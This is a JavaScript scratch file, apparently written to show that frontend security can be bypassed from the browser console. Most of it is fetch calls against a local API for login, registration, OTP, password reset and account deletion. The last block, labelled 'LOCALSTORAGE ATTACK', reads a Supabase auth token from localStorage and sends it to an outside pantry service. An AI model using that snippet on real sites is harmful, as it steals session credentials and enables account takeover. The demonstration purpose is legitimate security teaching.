//** Passing this codes via browser console tab to bypass the frontend security, that why the security should always be implement in both the frontend and backend */
//** In this way API can also be misused */

fetch('http://localhost:5000/api/v1/profile/details', {
    method: 'GET',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
    },
})
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));


// =======================================================

fetch('http://localhost:5000/api/v1/auth/login', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
    },
    body: {
        email: 'email@gmail.com',
        password: '11231654'
    }
})
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));

// ==============================================================
fetch('http://localhost:5000/api/v1/auth/register', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        firstName: 'testing',
        email: 'email@gmail.com',
        password: 'qwerty',
        enteredOTP: 12345
    })
})
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));


// ======================================================================

fetch('http://localhost:5000/api/v1/auth/send-email-otp', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        subject: 'testing',
        email: 'dyjezeje@azuretechtalk.net',
        excerpt: 'nice try boiiiii'
    })
})
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));

// ===============================================================
fetch('http://localhost:5000/api/v1/profile/delete-account', {
    method: 'DELETE',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        email: 'email@gmail.com',
        enteredOTP: 263624,
        password: "2131654"
    })
})
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));

// =============================================================

fetch('http://localhost:5000/api/v1/auth/reset-password', {
    method: 'PATCH',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({

        email: 'dyjezeje@azuretechtalk.net',
        newPassword: '21321654',
        enteredOTP: 121345

    })
})
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));

// ========================LOCALSTORAGE ATTACK=====================================
var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "name": "ai feita credential",
  "auth": localStorage.getItem("sb-supabase-auth-token")
});

var requestOptions = {
  method: 'PUT',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
};

fetch("https://getpantry.cloud/apiv1/pantry/e349a830-2b20-4a54-9403-3d26975b6f4f/basket/testBasket", requestOptions)
  .then(response => response.text())
  .then(result => console.log(result))
  .catch(error => console.log('error', error));
